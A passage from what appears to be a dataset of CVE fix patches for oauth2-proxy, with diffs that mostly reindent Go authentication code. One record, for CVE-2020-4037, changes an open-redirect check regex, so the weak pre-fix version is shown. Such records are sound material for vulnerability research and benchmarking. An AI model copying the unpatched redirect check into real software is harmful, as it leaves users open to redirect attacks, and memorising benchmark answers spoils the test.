Account\")\n+        }\n }\n \n // AuthenticateOnly checks whether the user is currently logged in\n func (p *OAuthProxy) AuthenticateOnly(rw http.ResponseWriter, req *http.Request) {\n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tif err != nil {\n-\t\thttp.Error(rw, \"unauthorized request\", http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\t// we are authenticated\n-\tp.addHeadersForProxying(rw, req, session)\n-\trw.WriteHeader(http.StatusAccepted)\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        if err != nil {\n+                http.Error(rw, \"unauthorized request\", http.StatusUnauthorized)\n+                return\n+        }\n+\n+        // we are authenticated\n+        p.addHeadersForProxying(rw, req, session)\n+        rw.WriteHeader(http.StatusAccepted)\n }\n \n // Proxy proxies the user request if the user is authenticated else it prompts\n // them to authenticate\n func (p *OAuthProxy) Proxy(rw http.ResponseWriter, req *http.Request) {\n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tswitch err {\n-\tcase nil:\n-\t\t// we are authenticated\n-\t\tp.addHeadersForProxying(rw, req, session)\n-\t\tp.serveMux.ServeHTTP(rw, req)\n-\n-\tcase ErrNeedsLogin:\n-\t\t// we need to send the user to a login screen\n-\t\tif isAjax(req) {\n-\t\t\t// no point redirecting an AJAX request\n-\t\t\tp.ErrorJSON(rw, http.StatusUnauthorized)\n-\t\t\treturn\n-\t\t}\n-\n-\t\tif p.SkipProviderButton {\n-\t\t\tp.OAuthStart(rw, req)\n-\t\t} else {\n-\t\t\tp.SignInPage(rw, req, http.StatusForbidden)\n-\t\t}\n-\n-\tdefault:\n-\t\t// unknown error\n-\t\tlogger.Printf(\"Unexpected internal error: %s\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError,\n-\t\t\t\"Internal Error\", \"Internal Error\")\n-\t}\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        switch err {\n+        case nil:\n+                // we are authenticated\n+                p.addHeadersForProxying(rw, req, session)\n+                p.serveMux.ServeHTTP(rw, req)\n+\n+        case ErrNeedsLogin:\n+                // we need to send the user to a login screen\n+                if isAjax(req) {\n+                        // no point redirecting an AJAX request\n+                        p.ErrorJSON(rw, http.StatusUnauthorized)\n+                        return\n+                }\n+\n+                if p.SkipProviderButton {\n+                        p.OAuthStart(rw, req)\n+                } else {\n+                        p.SignInPage(rw, req, http.StatusForbidden)\n+                }\n+\n+        default:\n+                // unknown error\n+                logger.Printf(\"Unexpected internal error: %s\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError,\n+                        \"Internal Error\", \"Internal Error\")\n+        }\n \n }\n \n@@ -876,303 +876,303 @@ func (p *OAuthProxy) Proxy(rw http.ResponseWriter, req *http.Request) {\n // Returns nil, ErrNeedsLogin if user needs to login.\n // Set-Cookie headers may be set on the response as a side-effect of calling this method.\n func (p *OAuthProxy) getAuthenticatedSession(rw http.ResponseWriter, req *http.Request) (*sessionsapi.SessionState, error) {\n-\tvar session *sessionsapi.SessionState\n-\tvar err error\n-\tvar saveSession, clearSession, revalidated bool\n-\n-\tif p.skipJwtBearerTokens && req.Header.Get(\"Authorization\") != \"\" {\n-\t\tsession, err = p.GetJwtSession(req)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error retrieving session from token in Authorization header: %s\", err)\n-\t\t}\n-\t\tif session != nil {\n-\t\t\tsaveSession = false\n-\t\t}\n-\t}\n-\n-\tremoteAddr := getRemoteAddr(req)\n-\tif session == nil {\n-\t\tsession, err = p.LoadCookiedSession(req)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error loading cookied session: %s\", err)\n-\t\t}\n-\n-\t\tif session != nil {\n-\t\t\tif session.Age() > p.CookieRefresh && p.CookieRefresh != time.Duration(0) {\n-\t\t\t\tlogger.Printf(\"Refreshing %s old session cookie for %s (refresh after %s)\", session.Age(), session, p.CookieRefresh)\n-\t\t\t\tsaveSession = true\n-\t\t\t}\n-\n-\t\t\tif ok, err := p.provider.RefreshSessionIfNeeded(session); err != nil {\n-\t\t\t\tlogger.Printf(\"%s removing session. error refreshing access token %s %s\", remoteAddr, err, session)\n-\t\t\t\tclearSession = true\n-\t\t\t\tsession = nil\n-\t\t\t} else if ok {\n-\t\t\t\tsaveSession = true\n-\t\t\t\trevalidated = true\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif session != nil && session.IsExpired() {\n-\t\tlogger.Printf(\"Removing session: token expired %s\", session)\n-\t\tsession = nil\n-\t\tsaveSession = false\n-\t\tclearSession = true\n-\t}\n-\n-\tif saveSession && !revalidated && session != nil && session.AccessToken != \"\" {\n-\t\tif !p.provider.ValidateSessionState(session) {\n-\t\t\tlogger.Printf(\"Removing session: error validating %s\", session)\n-\t\t\tsaveSession = false\n-\t\t\tsession = nil\n-\t\t\tclearSession = true\n-\t\t}\n-\t}\n-\n-\tif session != nil && session.Email != \"\" && !p.Validator(session.Email) {\n-\t\tlogger.Printf(session.Email, req, logger.AuthFailure, \"Invalid authentication via session: removing session %s\", session)\n-\t\tsession = nil\n-\t\tsaveSession = false\n-\t\tclearSession = true\n-\t}\n-\n-\tif saveSession && session != nil {\n-\t\terr = p.SaveSession(rw, req, session)\n-\t\tif err != nil {\n-\t\t\tlogger.PrintAuthf(session.Email, req, logger.AuthError, \"Save session error %s\", err)\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\tif clearSession {\n-\t\tp.ClearSessionCookie(rw, req)\n-\t}\n-\n-\tif session == nil {\n-\t\tsession, err = p.CheckBasicAuth(req)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error during basic auth validation: %s\", err)\n-\t\t}\n-\t}\n-\n-\tif session == nil {\n-\t\treturn nil, ErrNeedsLogin\n-\t}\n-\n-\treturn session, nil\n+        var session *sessionsapi.SessionState\n+        var err error\n+        var saveSession, clearSession, revalidated bool\n+\n+        if p.skipJwtBearerTokens && req.Header.Get(\"Authorization\") != \"\" {\n+                session, err = p.GetJwtSession(req)\n+                if err != nil {\n+                        logger.Printf(\"Error retrieving session from token in Authorization header: %s\", err)\n+                }\n+                if session != nil {\n+                        saveSession = false\n+                }\n+        }\n+\n+        remoteAddr := getRemoteAddr(req)\n+        if session == nil {\n+                session, err = p.LoadCookiedSession(req)\n+                if err != nil {\n+                        logger.Printf(\"Error loading cookied session: %s\", err)\n+                }\n+\n+                if session != nil {\n+                        if session.Age() > p.CookieRefresh && p.CookieRefresh != time.Duration(0) {\n+                                logger.Printf(\"Refreshing %s old session cookie for %s (refresh after %s)\", session.Age(), session, p.CookieRefresh)\n+                                saveSession = true\n+                        }\n+\n+                        if ok, err := p.provider.RefreshSessionIfNeeded(session); err != nil {\n+                                logger.Printf(\"%s removing session. error refreshing access token %s %s\", remoteAddr, err, session)\n+                                clearSession = true\n+                                session = nil\n+                        } else if ok {\n+                                saveSession = true\n+                                revalidated = true\n+                        }\n+                }\n+        }\n+\n+        if session != nil && session.IsExpired() {\n+                logger.Printf(\"Removing session: token expired %s\", session)\n+                session = nil\n+                saveSession = false\n+                clearSession = true\n+        }\n+\n+        if saveSession && !revalidated && session != nil && session.AccessToken != \"\" {\n+                if !p.provider.ValidateSessionState(session) {\n+                        logger.Printf(\"Removing session: error validating %s\", session)\n+                        saveSession = false\n+                        session = nil\n+                        clearSession = true\n+                }\n+        }\n+\n+        if session != nil && session.Email != \"\" && !p.Validator(session.Email) {\n+                logger.Printf(session.Email, req, logger.AuthFailure, \"Invalid authentication via session: removing session %s\", session)\n+                session = nil\n+                saveSession = false\n+                clearSession = true\n+        }\n+\n+        if saveSession && session != nil {\n+                err = p.SaveSession(rw, req, session)\n+                if err != nil {\n+                        logger.PrintAuthf(session.Email, req, logger.AuthError, \"Save session error %s\", err)\n+                        return nil, err\n+                }\n+        }\n+\n+        if clearSession {\n+                p.ClearSessionCookie(rw, req)\n+        }\n+\n+        if session == nil {\n+                session, err = p.CheckBasicAuth(req)\n+                if err != nil {\n+                        logger.Printf(\"Error during basic auth validation: %s\", err)\n+                }\n+        }\n+\n+        if session == nil {\n+                return nil, ErrNeedsLogin\n+        }\n+\n+        return session, nil\n }\n \n // addHeadersForProxying adds the appropriate headers the request / response for proxying\n func (p *OAuthProxy) addHeadersForProxying(rw http.ResponseWriter, req *http.Request, session *sessionsapi.SessionState) {\n-\tif p.PassBasicAuth {\n-\t\tif p.PreferEmailToUser && session.Email != \"\" {\n-\t\t\treq.SetBasicAuth(session.Email, p.BasicAuthPassword)\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.Email}\n-\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t} else {\n-\t\t\treq.SetBasicAuth(session.User, p.BasicAuthPassword)\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.User}\n-\t\t\tif session.Email != \"\" {\n-\t\t\t\treq.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n-\t\t\t} else {\n-\t\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t\t}\n-\t\t}\n-\t\tif session.PreferredUsername != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"X-Forwarded-Preferred-Username\")\n-\t\t}\n-\t}\n-\n-\tif p.PassUserHeaders {\n-\t\tif p.PreferEmailToUser && session.Email != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.Email}\n-\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t} else {\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.User}\n-\t\t\tif session.Email != \"\" {\n-\t\t\t\treq.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n-\t\t\t} else {\n-\t\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t\t}\n-\t\t}\n-\n-\t\tif session.PreferredUsername != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"X-Forwarded-Preferred-Username\")\n-\t\t}\n-\t}\n-\n-\tif p.SetXAuthRequest {\n-\t\trw.Header().Set(\"X-Auth-Request-User\", session.User)\n-\t\tif session.Email != \"\" {\n-\t\t\trw.Header().Set(\"X-Auth-Request-Email\", session.Email)\n-\t\t} else {\n-\t\t\trw.Header().Del(\"X-Auth-Request-Email\")\n-\t\t}\n-\t\tif session.PreferredUsername != \"\" {\n-\t\t\trw.Header().Set(\"X-Auth-Request-Preferred-Username\", session.PreferredUsername)\n-\t\t} else {\n-\t\t\trw.Header().Del(\"X-Auth-Request-Preferred-Username\")\n-\t\t}\n-\n-\t\tif p.PassAccessToken {\n-\t\t\tif session.AccessToken != \"\" {\n-\t\t\t\trw.Header().Set(\"X-Auth-Request-Access-Token\", session.AccessToken)\n-\t\t\t} else {\n-\t\t\t\trw.Header().Del(\"X-Auth-Request-Access-Token\")\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif p.PassAccessToken {\n-\t\tif session.AccessToken != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-Access-Token\"] = []string{session.AccessToken}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"X-Forwarded-Access-Token\")\n-\t\t}\n-\t}\n-\n-\tif p.PassAuthorization {\n-\t\tif session.IDToken != \"\" {\n-\t\t\treq.Header[\"Authorization\"] = []string{fmt.Sprintf(\"Bearer %s\", session.IDToken)}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"Authorization\")\n-\t\t}\n-\t}\n-\tif p.SetBasicAuth {\n-\t\tif session.User != \"\" {\n-\t\t\tauthVal := b64.StdEncoding.EncodeToString([]byte(session.User + \":\" + p.BasicAuthPassword))\n-\t\t\trw.Header().Set(\"Authorization\", \"Basic \"+authVal)\n-\t\t} else {\n-\t\t\trw.Header().Del(\"Authorization\")\n-\t\t}\n-\t}\n-\tif p.SetAuthorization {\n-\t\tif session.IDToken != \"\" {\n-\t\t\trw.Header().Set(\"Authorization\", fmt.Sprintf(\"Bearer %s\", session.IDToken))\n-\t\t} else {\n-\t\t\trw.Header().Del(\"Authorization\")\n-\t\t}\n-\t}\n-\n-\tif session.Email == \"\" {\n-\t\trw.Header().Set(\"GAP-Auth\", session.User)\n-\t} else {\n-\t\trw.Header().Set(\"GAP-Auth\", session.Email)\n-\t}\n+        if p.PassBasicAuth {\n+                if p.PreferEmailToUser && session.Email != \"\" {\n+                        req.SetBasicAuth(session.Email, p.BasicAuthPassword)\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.Email}\n+                        req.Header.Del(\"X-Forwarded-Email\")\n+                } else {\n+                        req.SetBasicAuth(session.User, p.BasicAuthPassword)\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.User}\n+                        if session.Email != \"\" {\n+                                req.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n+                        } else {\n+                                req.Header.Del(\"X-Forwarded-Email\")\n+                        }\n+                }\n+                if session.PreferredUsername != \"\" {\n+                        req.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n+                } else {\n+                        req.Header.Del(\"X-Forwarded-Preferred-Username\")\n+                }\n+        }\n+\n+        if p.PassUserHeaders {\n+                if p.PreferEmailToUser && session.Email != \"\" {\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.Email}\n+                        req.Header.Del(\"X-Forwarded-Email\")\n+                } else {\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.User}\n+                        if session.Email != \"\" {\n+                                req.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n+                        } else {\n+                                req.Header.Del(\"X-Forwarded-Email\")\n+                        }\n+                }\n+\n+                if session.PreferredUsername != \"\" {\n+                        req.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n+                } else {\n+                        req.Header.Del(\"X-Forwarded-Preferred-Username\")\n+                }\n+        }\n+\n+        if p.SetXAuthRequest {\n+                rw.Header().Set(\"X-Auth-Request-User\", session.User)\n+                if session.Email != \"\" {\n+                        rw.Header().Set(\"X-Auth-Request-Email\", session.Email)\n+                } else {\n+                        rw.Header().Del(\"X-Auth-Request-Email\")\n+                }\n+                if session.PreferredUsername != \"\" {\n+                        rw.Header().Set(\"X-Auth-Request-Preferred-Username\", session.PreferredUsername)\n+                } else {\n+                        rw.Header().Del(\"X-Auth-Request-Preferred-Username\")\n+                }\n+\n+                if p.PassAccessToken {\n+                        if session.AccessToken != \"\" {\n+                                rw.Header().Set(\"X-Auth-Request-Access-Token\", session.AccessToken)\n+                        } else {\n+                                rw.Header().Del(\"X-Auth-Request-Access-Token\")\n+                        }\n+                }\n+        }\n+\n+        if p.PassAccessToken {\n+                if session.AccessToken != \"\" {\n+                        req.Header[\"X-Forwarded-Access-Token\"] = []string{session.AccessToken}\n+                } else {\n+                        req.Header.Del(\"X-Forwarded-Access-Token\")\n+                }\n+        }\n+\n+        if p.PassAuthorization {\n+                if session.IDToken != \"\" {\n+                        req.Header[\"Authorization\"] = []string{fmt.Sprintf(\"Bearer %s\", session.IDToken)}\n+                } else {\n+                        req.Header.Del(\"Authorization\")\n+                }\n+        }\n+        if p.SetBasicAuth {\n+                if session.User != \"\" {\n+                        authVal := b64.StdEncoding.EncodeToString([]byte(session.User + \":\" + p.BasicAuthPassword))\n+                        rw.Header().Set(\"Authorization\", \"Basic \"+authVal)\n+                } else {\n+                        rw.Header().Del(\"Authorization\")\n+                }\n+        }\n+        if p.SetAuthorization {\n+                if session.IDToken != \"\" {\n+                        rw.Header().Set(\"Authorization\", fmt.Sprintf(\"Bearer %s\", session.IDToken))\n+                } else {\n+                        rw.Header().Del(\"Authorization\")\n+                }\n+        }\n+\n+        if session.Email == \"\" {\n+                rw.Header().Set(\"GAP-Auth\", session.User)\n+        } else {\n+                rw.Header().Set(\"GAP-Auth\", session.Email)\n+        }\n }\n \n // CheckBasicAuth checks the requests Authorization header for basic auth\n // credentials and authenticates these against the proxies HtpasswdFile\n func (p *OAuthProxy) CheckBasicAuth(req *http.Request) (*sessionsapi.SessionState, error) {\n-\tif p.HtpasswdFile == nil {\n-\t\treturn nil, nil\n-\t}\n-\tauth := req.Header.Get(\"Authorization\")\n-\tif auth == \"\" {\n-\t\treturn nil, nil\n-\t}\n-\ts := strings.SplitN(auth, \" \", 2)\n-\tif len(s) != 2 || s[0] != \"Basic\" {\n-\t\treturn nil, fmt.Errorf(\"invalid Authorization header %s\", req.Header.Get(\"Authorization\"))\n-\t}\n-\tb, err := b64.StdEncoding.DecodeString(s[1])\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tpair := strings.SplitN(string(b), \":\", 2)\n-\tif len(pair) != 2 {\n-\t\treturn nil, fmt.Errorf(\"invalid format %s\", b)\n-\t}\n-\tif p.HtpasswdFile.Validate(pair[0], pair[1]) {\n-\t\tlogger.PrintAuthf(pair[0], req, logger.AuthSuccess, \"Authenticated via basic auth and HTpasswd File\")\n-\t\treturn &sessionsapi.SessionState{User: pair[0]}, nil\n-\t}\n-\tlogger.PrintAuthf(pair[0], req, logger.AuthFailure, \"Invalid authentication via basic auth: not in Htpasswd File\")\n-\treturn nil, nil\n+        if p.HtpasswdFile == nil {\n+                return nil, nil\n+        }\n+        auth := req.Header.Get(\"Authorization\")\n+        if auth == \"\" {\n+                return nil, nil\n+        }\n+        s := strings.SplitN(auth, \" \", 2)\n+        if len(s) != 2 || s[0] != \"Basic\" {\n+                return nil, fmt.Errorf(\"invalid Authorization header %s\", req.Header.Get(\"Authorization\"))\n+        }\n+        b, err := b64.StdEncoding.DecodeString(s[1])\n+        if err != nil {\n+                return nil, err\n+        }\n+        pair := strings.SplitN(string(b), \":\", 2)\n+        if len(pair) != 2 {\n+                return nil, fmt.Errorf(\"invalid format %s\", b)\n+        }\n+        if p.HtpasswdFile.Validate(pair[0], pair[1]) {\n+                logger.PrintAuthf(pair[0], req, logger.AuthSuccess, \"Authenticated via basic auth and HTpasswd File\")\n+                return &sessionsapi.SessionState{User: pair[0]}, nil\n+        }\n+        logger.PrintAuthf(pair[0], req, logger.AuthFailure, \"Invalid authentication via basic auth: not in Htpasswd File\")\n+        return nil, nil\n }\n \n // isAjax checks if a request is an ajax request\n func isAjax(req *http.Request) bool {\n-\tacceptValues := req.Header.Values(\"Accept\")\n-\tconst ajaxReq = applicationJSON\n-\tfor _, v := range acceptValues {\n-\t\tif v == ajaxReq {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        acceptValues := req.Header.Values(\"Accept\")\n+        const ajaxReq = applicationJSON\n+        for _, v := range acceptValues {\n+                if v == ajaxReq {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // ErrorJSON returns the error code with an application/json mime type\n func (p *OAuthProxy) ErrorJSON(rw http.ResponseWriter, code int) {\n-\trw.Header().Set(\"Content-Type\", applicationJSON)\n-\trw.WriteHeader(code)\n+        rw.Header().Set(\"Content-Type\", applicationJSON)\n+        rw.WriteHeader(code)\n }\n \n // GetJwtSession loads a session based on a JWT token in the authorization header.\n // (see the config options skip-jwt-bearer-tokens and extra-jwt-issuers)\n func (p *OAuthProxy) GetJwtSession(req *http.Request) (*sessionsapi.SessionState, error) {\n-\trawBearerToken, err := p.findBearerToken(req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tctx := context.Background()\n-\tfor _, verifier := range p.jwtBearerVerifiers {\n-\t\tbearerToken, err := verifier.Verify(ctx, rawBearerToken)\n-\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"failed to verify bearer token: %v\", err)\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\treturn p.provider.CreateSessionStateFromBearerToken(rawBearerToken, bearerToken)\n-\t}\n-\treturn nil, fmt.Errorf(\"unable to verify jwt token %s\", req.Header.Get(\"Authorization\"))\n+        rawBearerToken, err := p.findBearerToken(req)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        ctx := context.Background()\n+        for _, verifier := range p.jwtBearerVerifiers {\n+                bearerToken, err := verifier.Verify(ctx, rawBearerToken)\n+\n+                if err != nil {\n+                        logger.Printf(\"failed to verify bearer token: %v\", err)\n+                        continue\n+                }\n+\n+                return p.provider.CreateSessionStateFromBearerToken(rawBearerToken, bearerToken)\n+        }\n+        return nil, fmt.Errorf(\"unable to verify jwt token %s\", req.Header.Get(\"Authorization\"))\n }\n \n // findBearerToken finds a valid JWT token from the Authorization header of a given request.\n func (p *OAuthProxy) findBearerToken(req *http.Request) (string, error) {\n-\tauth := req.Header.Get(\"Authorization\")\n-\ts := strings.SplitN(auth, \" \", 2)\n-\tif len(s) != 2 {\n-\t\treturn \"\", fmt.Errorf(\"invalid authorization header %s\", auth)\n-\t}\n-\tjwtRegex := regexp.MustCompile(`^eyJ[a-zA-Z0-9_-]*\\.eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]+$`)\n-\tvar rawBearerToken string\n-\tif s[0] == \"Bearer\" && jwtRegex.MatchString(s[1]) {\n-\t\trawBearerToken = s[1]\n-\t} else if s[0] == \"Basic\" {\n-\t\t// Check if we have a Bearer token masquerading in Basic\n-\t\tb, err := b64.StdEncoding.DecodeString(s[1])\n-\t\tif err != nil {\n-\t\t\treturn \"\", err\n-\t\t}\n-\t\tpair := strings.SplitN(string(b), \":\", 2)\n-\t\tif len(pair) != 2 {\n-\t\t\treturn \"\", fmt.Errorf(\"invalid format %s\", b)\n-\t\t}\n-\t\tuser, password := pair[0], pair[1]\n-\n-\t\t// check user, user+password, or just password for a token\n-\t\tif jwtRegex.MatchString(user) {\n-\t\t\t// Support blank passwords or magic `x-oauth-basic` passwords - nothing else\n-\t\t\tif password == \"\" || password == \"x-oauth-basic\" {\n-\t\t\t\trawBearerToken = user\n-\t\t\t}\n-\t\t} else if jwtRegex.MatchString(password) {\n-\t\t\t// support passwords and ignore user\n-\t\t\trawBearerToken = password\n-\t\t}\n-\t}\n-\tif rawBearerToken == \"\" {\n-\t\treturn \"\", fmt.Errorf(\"no valid bearer token found in authorization header\")\n-\t}\n-\n-\treturn rawBearerToken, nil\n+        auth := req.Header.Get(\"Authorization\")\n+        s := strings.SplitN(auth, \" \", 2)\n+        if len(s) != 2 {\n+                return \"\", fmt.Errorf(\"invalid authorization header %s\", auth)\n+        }\n+        jwtRegex := regexp.MustCompile(`^eyJ[a-zA-Z0-9_-]*\\.eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]+$`)\n+        var rawBearerToken string\n+        if s[0] == \"Bearer\" && jwtRegex.MatchString(s[1]) {\n+                rawBearerToken = s[1]\n+        } else if s[0] == \"Basic\" {\n+                // Check if we have a Bearer token masquerading in Basic\n+                b, err := b64.StdEncoding.DecodeString(s[1])\n+                if err != nil {\n+                        return \"\", err\n+                }\n+                pair := strings.SplitN(string(b), \":\", 2)\n+                if len(pair) != 2 {\n+                        return \"\", fmt.Errorf(\"invalid format %s\", b)\n+                }\n+                user, password := pair[0], pair[1]\n+\n+                // check user, user+password, or just password for a token\n+                if jwtRegex.MatchString(user) {\n+                        // Support blank passwords or magic `x-oauth-basic` passwords - nothing else\n+                        if password == \"\" || password == \"x-oauth-basic\" {\n+                                rawBearerToken = user\n+                        }\n+                } else if jwtRegex.MatchString(password) {\n+                        // support passwords and ignore user\n+                        rawBearerToken = password\n+                }\n+        }\n+        if rawBearerToken == \"\" {\n+                return \"\", fmt.Errorf(\"no valid bearer token found in authorization header\")\n+        }\n+\n+        return rawBearerToken, nil\n }\n"}
{"cve":"CVE-2020-4037:0708", "fix_patch": "diff --git a/oauthproxy.go b/oauthproxy.go\nindex 8c303df8..20f5a4f9 100644\n--- a/oauthproxy.go\n+++ b/oauthproxy.go\n@@ -1,563 +1,563 @@\n package main\n \n import (\n-\t\"context\"\n-\t\"crypto/tls\"\n-\tb64 \"encoding/base64\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"html/template\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/http/httputil\"\n-\t\"net/url\"\n-\t\"regexp\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/coreos/go-oidc\"\n-\t\"github.com/mbland/hmacauth\"\n-\tipapi \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/ip\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/options\"\n-\tsessionsapi \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/sessions\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/cookies\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/encryption\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/ip\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/pkg/logger\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/providers\"\n-\t\"github.com/yhat/wsutil\"\n+        \"context\"\n+        \"crypto/tls\"\n+        b64 \"encoding/base64\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"html/template\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/http/httputil\"\n+        \"net/url\"\n+        \"regexp\"\n+        \"strconv\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/coreos/go-oidc\"\n+        \"github.com/mbland/hmacauth\"\n+        ipapi \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/ip\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/options\"\n+        sessionsapi \"github.com/oauth2-proxy/oauth2-proxy/pkg/apis/sessions\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/cookies\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/encryption\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/ip\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/pkg/logger\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/providers\"\n+        \"github.com/yhat/wsutil\"\n )\n \n const (\n-\t// SignatureHeader is the name of the request header containing the GAP Signature\n-\t// Part of hmacauth\n-\tSignatureHeader = \"GAP-Signature\"\n+        // SignatureHeader is the name of the request header containing the GAP Signature\n+        // Part of hmacauth\n+        SignatureHeader = \"GAP-Signature\"\n \n-\thttpScheme  = \"http\"\n-\thttpsScheme = \"https\"\n+        httpScheme  = \"http\"\n+        httpsScheme = \"https\"\n \n-\tapplicationJSON = \"application/json\"\n+        applicationJSON = \"application/json\"\n )\n \n // SignatureHeaders contains the headers to be signed by the hmac algorithm\n // Part of hmacauth\n var SignatureHeaders = []string{\n-\t\"Content-Length\",\n-\t\"Content-Md5\",\n-\t\"Content-Type\",\n-\t\"Date\",\n-\t\"Authorization\",\n-\t\"X-Forwarded-User\",\n-\t\"X-Forwarded-Email\",\n-\t\"X-Forwarded-Preferred-User\",\n-\t\"X-Forwarded-Access-Token\",\n-\t\"Cookie\",\n-\t\"Gap-Auth\",\n+        \"Content-Length\",\n+        \"Content-Md5\",\n+        \"Content-Type\",\n+        \"Date\",\n+        \"Authorization\",\n+        \"X-Forwarded-User\",\n+        \"X-Forwarded-Email\",\n+        \"X-Forwarded-Preferred-User\",\n+        \"X-Forwarded-Access-Token\",\n+        \"Cookie\",\n+        \"Gap-Auth\",\n }\n \n var (\n-\t// ErrNeedsLogin means the user should be redirected to the login page\n-\tErrNeedsLogin = errors.New(\"redirect to login page\")\n+        // ErrNeedsLogin means the user should be redirected to the login page\n+        ErrNeedsLogin = errors.New(\"redirect to login page\")\n \n-\t// Used to check final redirects are not susceptible to open redirects.\n-\t// Matches //, /\\ and both of these with whitespace in between (eg / / or / \\).\n-\tinvalidRedirectRegex = regexp.MustCompile(`^/(\\s|\\v)?(/|\\\\)`)\n+        // Used to check final redirects are not susceptible to open redirects.\n+        // Matches //, /\\ and both of these with whitespace in between (eg / / or / \\).\n+        invalidRedirectRegex = regexp.MustCompile(`^/(\\s|\\v)*(/|\\\\)`)\n )\n \n // OAuthProxy is the main authentication proxy\n type OAuthProxy struct {\n-\tCookieSeed     string\n-\tCookieName     string\n-\tCSRFCookieName string\n-\tCookieDomains  []string\n-\tCookiePath     string\n-\tCookieSecure   bool\n-\tCookieHTTPOnly bool\n-\tCookieExpire   time.Duration\n-\tCookieRefresh  time.Duration\n-\tCookieSameSite string\n-\tValidator      func(string) bool\n-\n-\tRobotsPath        string\n-\tSignInPath        string\n-\tSignOutPath       string\n-\tOAuthStartPath    string\n-\tOAuthCallbackPath string\n-\tAuthOnlyPath      string\n-\tUserInfoPath      string\n-\n-\tredirectURL             *url.URL // the url to receive requests at\n-\twhitelistDomains        []string\n-\tprovider                providers.Provider\n-\tproviderNameOverride    string\n-\tsessionStore            sessionsapi.SessionStore\n-\tProxyPrefix             string\n-\tSignInMessage           string\n-\tHtpasswdFile            *HtpasswdFile\n-\tDisplayHtpasswdForm     bool\n-\tserveMux                http.Handler\n-\tSetXAuthRequest         bool\n-\tPassBasicAuth           bool\n-\tSetBasicAuth            bool\n-\tSkipProviderButton      bool\n-\tPassUserHeaders         bool\n-\tBasicAuthPassword       string\n-\tPassAccessToken         bool\n-\tSetAuthorization        bool\n-\tPassAuthorization       bool\n-\tPreferEmailToUser       bool\n-\tskipAuthRegex           []string\n-\tskipAuthPreflight       bool\n-\tskipJwtBearerTokens     bool\n-\tmainJwtBearerVerifier   *oidc.IDTokenVerifier\n-\textraJwtBearerVerifiers []*oidc.IDTokenVerifier\n-\tcompiledRegex           []*regexp.Regexp\n-\ttemplates               *template.Template\n-\trealClientIPParser      ipapi.RealClientIPParser\n-\tBanner                  string\n-\tFooter                  string\n+        CookieSeed     string\n+        CookieName     string\n+        CSRFCookieName string\n+        CookieDomains  []string\n+        CookiePath     string\n+        CookieSecure   bool\n+        